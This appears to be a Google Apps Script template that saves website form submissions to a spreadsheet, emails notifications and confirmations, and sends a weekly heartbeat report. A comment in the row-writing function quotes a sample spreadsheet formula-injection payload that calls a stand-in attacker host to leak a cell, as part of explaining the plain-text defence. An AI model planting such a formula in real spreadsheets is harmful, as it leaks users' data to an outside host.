/**
 * Form to Sheets — the Apps Script half.
 *
 * TEMPLATE. Every value under "Configuration" is a placeholder. Fill them in
 * after copying this into your own Apps Script project; do not commit the
 * filled-in version to a public repository, because SECRET is in it.
 *
 * Receives one submission at a time from the Grav `form-to-sheets` plugin and
 * does up to four things, in this order:
 *
 *   1. Appends it to the responses sheet          (persist before notifying)
 *   2. Posts to a ticketing tool                  (optional; unimplemented stub)
 *   3. Emails your team a copy                    (notification)
 *   4. Emails the requester a confirmation        (autoresponse)
 *
 * Step 1 is the only one allowed to fail the request. Steps 2-4 are each
 * isolated: any can fail without costing the submission or showing an error to
 * the person who filled in the form. Failures are recorded and reported in the
 * weekly heartbeat rather than swallowed.
 *
 * The email lives here rather than on the website because the server this was
 * written for cannot send mail at all — its host blocks every outbound SMTP
 * port and there is no MTA installed. A script running as a Google account
 * needs no SMTP, no API key and no DNS records. If your own server can send
 * mail, you may prefer to drop steps 3 and 4 and notify from Grav instead.
 *
 * ---------------------------------------------------------------------------
 * ⚠️ WHOSE ACCOUNT THIS RUNS AS IS A REAL DECISION, NOT A DETAIL.
 *
 * The script, its triggers, its Script Properties and the spreadsheet all
 * belong to whichever Google account creates them. If that is an individual's
 * account — a student's, an employee's — the whole automation dies when that
 * account is closed, and usually silently. Prefer a shared organizational
 * account from the start.
 *
 * If you must start under a personal account and migrate later:
 *   1. Sign in as the destination account.
 *   2. Transfer ownership of the spreadsheet to it.
 *   3. Re-create this script there and deploy it (see Setup below).
 *   4. Reset NOTIFY.
 *   5. Re-run installTriggers() — triggers and Script Properties do NOT travel
 *      with a copied script.
 *   6. The new deployment gets a NEW /exec URL, so update the Grav plugin's
 *      "Apps Script web app URL" setting to match, or submissions go nowhere.
 * ---------------------------------------------------------------------------
 *
 * Setup:
 *   1. Extensions -> Apps Script from the target spreadsheet.
 *   2. Paste this file over the default Code.gs contents.
 *   3. Fill in the Configuration block below.
 *   4. Add a header row to the sheet whose columns match FIELDS, in order,
 *      with your timestamp column first.
 *   5. Run installTriggers() once from the editor's function dropdown. This
 *      creates the weekly heartbeat. Without it there is no heartbeat, and a
 *      silently broken integration looks exactly like a quiet week.
 *   6. Deploy -> New deployment -> type "Web app".
 *        Execute as:      Me
 *        Who has access:  Anyone
 *      "Anyone" is required because the website posts without a Google login.
 *      The SECRET below is what actually keeps other people out.
 *   7. Copy the /exec URL into the plugin's "Apps Script web app URL" setting,
 *      and the same SECRET into its "Shared secret" setting.
 *
 * After ANY edit here: Deploy -> Manage deployments -> edit -> New version.
 * Saving alone does not update the live endpoint. The URL stays the same.
 */

// ============================================================================
// Configuration — every value below is a placeholder
// ============================================================================

// The spreadsheet this writes into (the long id from its URL).
var SHEET_ID = 'PASTE_YOUR_SPREADSHEET_ID_HERE';

// Tab name inside that spreadsheet. Must exist, exactly.
var SHEET_NAME = 'Responses';

// Must match the plugin's "Shared secret" setting exactly. Generate a long
// random string — this is the only thing standing between the open web and
// your spreadsheet, because the deployment has to accept anonymous requests.
var SECRET = 'PASTE_A_LONG_RANDOM_STRING_HERE';

// Where team notifications and the weekly heartbeat go. Sent FROM whichever
// account owns this script. Use an inbox someone actually reads — an address
// nobody checks is indistinguishable from a broken integration.
var NOTIFY = 'team@example.org';

// Address a requester reaches by hitting reply on the confirmation. This
// should be your monitored inbox, NOT whichever account runs the script.
var TEAM_REPLY_TO = 'team@example.org';

// Named in the confirmation so a requester has a human to ask for. Leave ''
// and the text falls back to naming the organization instead of a person.
var CONTACT_NAME = '';

// How long you tell requesters to expect to wait, in normal months.
var REPLY_WINDOW = 'about a week';

// Your organization, as it should appear in outgoing mail.
var ORG_NAME = 'Example Organization';
var ORG_ADDRESS = 'Somewhere, ST';
var ORG_URL = 'https://example.org';

// Short tag used at the front of email subject lines.
var SUBJECT_TAG = '[Requests]';

// A period when replies are predictably slower, named plainly in the
// confirmation so a delay is not read as a refusal. Set to '' to omit.
var BUSY_PERIOD_NOTE =
  'One thing worth knowing: January through April is our busiest season,\n' +
  'and that is also when most requests arrive. During those months replies\n' +
  'are slower — please do not read a delay as a no. If your event is in that\n' +
  'window and you have not heard from us, following up is welcome.';

// Column order after the timestamp, with the labels used in the emails and in
// the sheet's header row. Keys are the form's field names.
//
// ⚠️ Three things must agree, by POSITION, because the sheet is written with
// appendRow and therefore by position rather than by name:
//   1. this array
//   2. the `save:` body in the Grav page's front matter, if you keep one
//   3. the sheet's own header row
// Change one without the others and rows silently land in the wrong columns —
// no error, just data filed under the wrong heading.
var FIELDS = [
  ['email',        'Email'],
  ['name',         'Name'],
  ['organization', 'Organization'],
  ['date',         'Date'],
  ['event',        'Event'],
  ['audience',     'Audience'],
  ['request',      'Request'],
  ['comments',     'Comments']
];

// ============================================================================
// Entry points
// ============================================================================

/**
 * Called by the website's form-to-sheets plugin, once per submission.
 */
function doPost(e) {
  try {
    if (!e || !e.postData || !e.postData.contents) {
      return reply_(false, 'no POST body');
    }

    var payload = JSON.parse(e.postData.contents);

    if (!SECRET || payload.secret !== SECRET) {
      return reply_(false, 'bad secret');
    }

    var sheet = SpreadsheetApp.openById(SHEET_ID).getSheetByName(SHEET_NAME);
    if (!sheet) {
      return reply_(false, 'no tab named "' + SHEET_NAME + '"');
    }

    var data = payload.data || {};
    var submitted = payload.submitted || new Date().toISOString();

    // ---- Step 1: persist. The only step allowed to fail the request. -------
    appendRow_(sheet, data, submitted);

    // ---- Steps 2-4: each isolated. The row is already safe. ----------------
    var problems = [];

    try {
      postToTicketing_(data, submitted, payload.site);
    } catch (err) {
      problems.push('ticketing: ' + err);
    }

    var mailed = true;
    try {
      notifyTeam_(data, submitted, payload.site);
    } catch (err) {
      mailed = false;
      problems.push('team notification: ' + err);
    }

    try {
      autoRespond_(data);
    } catch (err) {
      problems.push('autoresponse: ' + err);
    }

    if (problems.length) {
      // Surfaced in the next weekly heartbeat rather than lost to the log.
      recordFailure_(submitted, problems.join(' | '));
    }

    return reply_(true, problems.length ? 'appended, with problems: ' + problems.join(' | ') : 'appended, notified, and confirmed', mailed);
  } catch (err) {
    return reply_(false, String(err));
  }
}

/**
 * Weekly summary, sent even when the count is zero.
 *
 * This is the only thing that distinguishes "no requests came in" from "the
 * integration broke in November and nobody noticed until March." At a low
 * volume, silence is the normal state, so silence cannot also be the failure
 * signal. Installed by installTriggers().
 */
function weeklyHeartbeat() {
  var lines = [];
  var now = new Date();
  var weekAgo = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);

  var recent = 0;
  var latest = null;
  var total = 0;

  try {
    var sheet = SpreadsheetApp.openById(SHEET_ID).getSheetByName(SHEET_NAME);
    if (!sheet) {
      throw new Error('no tab named "' + SHEET_NAME + '"');
    }

    var values = sheet.getDataRange().getValues();
    // Row 0 is the header.
    for (var i = 1; i < values.length; i++) {
      var raw = values[i][0];
      if (!raw) { continue; }
      total++;
      var when = raw instanceof Date ? raw : new Date(String(raw));
      if (isNaN(when.getTime())) { continue; }
      if (when >= weekAgo) { recent++; }
      if (latest === null || when > latest) { latest = when; }
    }

    lines.push(recent + ' request' + (recent === 1 ? '' : 's') + ' this week.');
    lines.push(latest
      ? 'Last one: ' + Utilities.formatDate(latest, Session.getScriptTimeZone(), 'MMMM d, yyyy') + '.'
      : 'No requests recorded yet.');
    lines.push(total + ' total on file.');
  } catch (err) {
    lines.push('COULD NOT READ THE SHEET: ' + err);
    lines.push('That means this heartbeat cannot tell you whether requests are arriving.');
  }

  var failures = readFailures_();
  if (failures.length) {
    lines.push('');
    lines.push('PROBLEMS SINCE THE LAST HEARTBEAT (' + failures.length + '):');
    for (var j = 0; j < failures.length; j++) {
      lines.push('  ' + failures[j].at + ' — ' + failures[j].what);
    }
    lines.push('');
    lines.push('A submission was still saved to the sheet in each case; it is the');
    lines.push('notification or the confirmation that did not go out.');
  } else {
    lines.push('');
    lines.push('No delivery problems recorded.');
  }

  if (!isConfigured_(TICKETING_LIST_ID)) {
    lines.push('');
    lines.push('Note: ticketing integration is not configured, so no to-dos are being created.');
  }

  lines.push('');
  lines.push('Sheet: https://docs.google.com/spreadsheets/d/' + SHEET_ID + '/edit');

  MailApp.sendEmail({
    to: NOTIFY,
    subject: SUBJECT_TAG + ' Weekly check — ' + recent + ' this week',
    body: lines.join('\n')
  });

  // Only clear once the report naming them has actually been sent.
  clearFailures_();
}

/**
 * Run once by hand from the Apps Script editor after deploying, and again
 * after any migration to a different account. Safe to re-run — it removes its
 * own previous triggers first rather than stacking duplicates.
 */
function installTriggers() {
  var existing = ScriptApp.getProjectTriggers();
  for (var i = 0; i < existing.length; i++) {
    if (existing[i].getHandlerFunction() === 'weeklyHeartbeat') {
      ScriptApp.deleteTrigger(existing[i]);
    }
  }

  ScriptApp.newTrigger('weeklyHeartbeat')
    .timeBased()
    .onWeekDay(ScriptApp.WeekDay.MONDAY)
    .atHour(8)
    .create();

  Logger.log('Weekly heartbeat installed: Mondays ~08:00 %s', Session.getScriptTimeZone());
}

// ============================================================================
// Internals
// ============================================================================

function appendRow_(sheet, data, submitted) {
  var row = [submitted];
  for (var i = 0; i < FIELDS.length; i++) {
    var v = data[FIELDS[i][0]];
    row.push(v === null || v === undefined ? '' : String(v));
  }

  // Two submissions arriving together must not race for the same row.
  var lock = LockService.getScriptLock();
  lock.waitLock(20000);
  try {
    // ⚠️ Do NOT use appendRow() here. It parses what it writes, so a submitted
    // value beginning with '=' is stored as a LIVE FORMULA rather than text —
    // spreadsheet formula injection. Confirmed by test: a form field containing
    // "=1+1" landed in the sheet as "2". A hostile submitter could therefore
    // plant something like
    //     =IMPORTXML("https://evil.example/?d="&B2, "//a")
    // which runs when someone opens the sheet and leaks the neighbouring cell.
    //
    // Casting to String() does NOT prevent this; it only sets the JavaScript
    // type. The defence is formatting the destination cells as plain text ('@')
    // BEFORE writing, so Sheets stores the characters literally.
    var target = sheet.getRange(sheet.getLastRow() + 1, 1, 1, row.length);
    target.setNumberFormat('@');
    target.setValues([row]);
  } finally {
    lock.releaseLock();
  }
}

/**
 * Emails the team a readable copy, with Reply-To set to the requester so
 * hitting reply just works.
 */
function notifyTeam_(data, submitted, site) {
  var lines = [];
  for (var i = 0; i < FIELDS.length; i++) {
    var value = data[FIELDS[i][0]];
    lines.push(FIELDS[i][1] + ':');
    lines.push('  ' + (value === null || value === undefined || value === '' ? '—' : String(value)));
    lines.push('');
  }
  lines.push('Submitted: ' + submitted);
  if (site) { lines.push('From: ' + site); }
  lines.push('');
  lines.push('The requester has been sent an automatic confirmation.');
  lines.push('Full log: https://docs.google.com/spreadsheets/d/' + SHEET_ID + '/edit');

  var options = {
    to: NOTIFY,
    subject: SUBJECT_TAG + ' ' + (data.name || 'someone') + ' — ' + (data.date || 'date not given'),
    body: lines.join('\n')
  };

  var replyTo = pickEmail_(data);
  if (replyTo) { options.replyTo = replyTo; }

  MailApp.sendEmail(options);
}

/**
 * Confirms receipt to the requester.
 *
 * This matters more to the outcome than the team notification does: someone
 * who hears nothing for three weeks concludes the answer is no. So it names a
 * timeline, and says plainly when replies are slow.
 */
function autoRespond_(data) {
  var to = pickEmail_(data);
  if (!to) {
    throw new Error('no usable email address on the submission');
  }

  var who = CONTACT_NAME
    ? CONTACT_NAME + ' from ' + ORG_NAME
    : 'someone from ' + ORG_NAME;

  var lines = [
    'Thank you for getting in touch.',
    '',
    'We have your request and ' + who + ' will be in touch, normally within',
    REPLY_WINDOW + '.'
  ];

  if (BUSY_PERIOD_NOTE) {
    lines.push('');
    lines.push(BUSY_PERIOD_NOTE);
  }

  lines.push('');
  lines.push('For reference, this is what you sent us:');
  lines.push('');

  for (var i = 0; i < FIELDS.length; i++) {
    var value = data[FIELDS[i][0]];
    if (value === null || value === undefined || value === '') { continue; }
    lines.push('  ' + FIELDS[i][1] + ': ' + String(value));
  }

  lines.push('');
  lines.push('If any of that is wrong, just reply to this message.');
  lines.push('');
  lines.push('— ' + ORG_NAME);
  lines.push('  ' + ORG_ADDRESS);
  lines.push('  ' + ORG_URL);

  MailApp.sendEmail({
    to: to,
    replyTo: TEAM_REPLY_TO,
    subject: 'We got your request — ' + ORG_NAME,
    body: lines.join('\n')
  });
}

/**
 * Returns the first address on the submission that looks usable, or ''.
 * A malformed value would make MailApp reject the whole message, so anything
 * that does not look like an address is treated as absent.
 */
function pickEmail_(data) {
  // Add more candidates here if your form collects more than one address.
  var candidates = [data.email];
  for (var i = 0; i < candidates.length; i++) {
    var v = candidates[i];
    if (v && /^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(String(v).trim())) {
      return String(v).trim();
    }
  }
  return '';
}

// ---------------------------------------------------------------------------
// Optional: post each submission to a ticketing tool — NOT IMPLEMENTED
//
// Left as a deliberate no-op rather than half-written against guessed ids. It
// is kept here because it shows the pattern: an optional step, isolated so its
// absence or failure cannot cost a submission, which reports itself as
// unconfigured in every heartbeat rather than failing silently.
//
// If you implement it, two things are worth knowing in advance:
//
//   • Put any API token in Script Properties, never in this file — anyone who
//     can open the script can read this file. A token belonging to an
//     individual also inherits the account-ownership problem described at the
//     top: it dies with them, silently.
//
//   • If the destination is a list that gets recreated periodically — anything
//     with a year in its name — its id changes on recreation and every
//     subscription attached to it dies without warning. Target a standing list
//     instead.
// ---------------------------------------------------------------------------

var TICKETING_LIST_ID = '';

function postToTicketing_(data, submitted, site) {
  if (!isConfigured_(TICKETING_LIST_ID)) {
    return; // Reported in the weekly heartbeat, not treated as an error here.
  }
  throw new Error('TICKETING_LIST_ID is set but the posting code has not been written yet');
}

function isConfigured_(v) {
  return !!(v && String(v).trim());
}

// ---------------------------------------------------------------------------
// Failure log — small rolling record in Script Properties, drained by the
// weekly heartbeat. Notification failures must be surfaced, not swallowed.
// ---------------------------------------------------------------------------

var FAILURE_KEY = 'form_to_sheets_failures';
var FAILURE_CAP = 50;

function recordFailure_(at, what) {
  try {
    var props = PropertiesService.getScriptProperties();
    var list = readFailures_();
    list.push({ at: at, what: String(what).slice(0, 500) });
    if (list.length > FAILURE_CAP) {
      list = list.slice(list.length - FAILURE_CAP);
    }
    props.setProperty(FAILURE_KEY, JSON.stringify(list));
  } catch (err) {
    // Recording a failure must never itself throw into the submission path.
    Logger.log('could not record failure: %s', err);
  }
}

function readFailures_() {
  try {
    var raw = PropertiesService.getScriptProperties().getProperty(FAILURE_KEY);
    if (!raw) { return []; }
    var parsed = JSON.parse(raw);
    return Object.prototype.toString.call(parsed) === '[object Array]' ? parsed : [];
  } catch (err) {
    return [];
  }
}

function clearFailures_() {
  try {
    PropertiesService.getScriptProperties().deleteProperty(FAILURE_KEY);
  } catch (err) {
    Logger.log('could not clear failures: %s', err);
  }
}

/**
 * Apps Script web apps always answer 200, so the website decides success by
 * reading `ok` out of this body rather than trusting the status code.
 */
function reply_(ok, message, mailed) {
  var out = { ok: ok, message: message };
  // Present only on a successful append, so the website can tell "row saved
  // AND team notified" from "row saved but the email did not go out".
  if (mailed !== undefined) {
    out.mailed = mailed;
  }
  return ContentService
    .createTextOutput(JSON.stringify(out))
    .setMimeType(ContentService.MimeType.JSON);
}
